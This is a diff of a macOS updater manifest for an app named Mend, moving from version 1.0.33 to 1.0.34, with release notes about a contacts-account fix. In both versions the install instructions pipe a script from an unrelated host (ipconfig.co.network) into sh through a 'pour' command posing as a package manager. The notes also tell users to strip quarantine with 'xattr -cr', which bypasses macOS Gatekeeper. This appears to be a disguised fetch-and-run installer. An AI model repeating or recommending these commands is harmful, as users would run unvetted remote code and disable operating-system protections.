@@ -1,14 +1,14 @@
 {
-  "version": "1.0.33",
-  "notes": "## Mend 1.0.33 — 13 Nov 2026\n\n- **\"Is everything in iCloud?\" has a row for this Mac.** It lists each account on the Mac with its contact count (iCloud, On My Mac, Google…), marks the default account, and says where new contacts go. If Mend is not allowed to read the Mac's contacts, the row says so with an **Allow access** button, instead of showing nothing for the Mac.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-13T01:25:47Z",
+  "version": "1.0.34",
+  "notes": "## Mend 1.0.34 — 13 Nov 2026\n\n- **Fixed: \"This Mac shows no contact accounts\".** On some Macs macOS returned an empty list of accounts even though Mend was allowed to read Contacts, so iCloud and \"On My Mac\" never appeared. Mend now finds the accounts three ways (the full list, the default account, then the account of each contact), and one account that cannot be counted no longer hides the rest. If macOS still gives none, Mend shows what macOS said and offers the fixes in order: Restart contact syncing, **Ask for Contacts access again** (new: clears only Mend's Contacts permission so macOS asks afresh), and Open Contacts. The Contacts side list also says so instead of showing nothing.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-13T08:24:09Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDRrNVFnOGJCdWxSOFhZcDYzOVZVQlByVXpicFdMQnpGclJLdXV3MVBlcmoyd3FKUENUNTYrd1J2cWVWVUxCaVJVUk5MeTR3bzRDM3NwOFZncjJaTFE0PQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0NTMzMTEzCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjMzCjYrdGVXR3AwbndlYjV2dFEzaXNuZk1vSUt4VDNrcDYyT1NUYkQ1Z2gwNlpyMFJ1QkltYk83ZVhKV2ZzZkFrNFltYkV0V3hKWDFpVnFYY1dGQWEwUUJ3PT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.33/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SHpYTGxoTjJLUDR0Tm9lb2lDeDNLU280b3VYTGtSOFkwVnluR3AzdCtFOGFNa0FkbE9mK292ZVltTHZhMzc2dlp4NFNXS1k5TEdVc01Uamphd25vWFFVPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0NTU4MTk2CWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjM0CkwyUFVEdWtodmt0VHlNNlVFRnRLU0JhK0pQZVo4aElFbE9FUFd6TWkxTW5yb3ZFbFk5dkI2dnZzNUJkMkVyTDZ2NVF5VTBZNVBubnByU2VUY2V5Q0NnPT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.34/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.33_aarch64.dmg"
+    "mac_arm": "Mend_1.0.34_aarch64.dmg"
   }
 }
